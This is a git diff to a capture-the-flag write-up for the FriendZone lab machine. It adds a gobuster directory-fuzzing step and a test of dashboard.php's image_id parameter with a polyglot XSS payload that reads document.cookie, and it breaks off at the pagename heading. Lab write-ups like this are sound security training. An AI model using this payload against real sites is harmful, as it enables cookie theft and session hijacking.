@@ -222,10 +222,28 @@ vpn.friendzoneportal.red -> Not Found
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c73a2714-1bf3-461f-b856-9c023ac49200)
 
-+ Directory fuzzing to enumerate directories on **https://administrator1.friendzone.red/**:
++ Directory fuzzing to enumerate directories on **https://administrator1.friendzone.red/**, and nothing is interesting.
 ```
 gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://administrator1.friendzone.red/ -k -n -x html,php,txt -r -t 40
 ```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7a0143cc-b2ce-4fcd-aee3-d4c569e1cbf8)
+
+
+### image_id
++ Instead, focus on **?image_id=a.jpg&pagename=timestamp** parameters of `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp`.
++ Try xss payload on **image_id** parameter:
+```
+jaVasCript:/-///'/"/*/(//oNcliCk=alert(1) )//%0D%0A%0d%0a //</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(document.cookie)//>\x3e
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/eea84d27-857d-442b-95ef-f59c1d3cee35)
+
++ It pop-ups, and but the image link is broken. Pass to the second parameter.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9e45d00f-2dc9-44cc-866f-6f3246b21fc1)
+
+### pagename
 
 
 
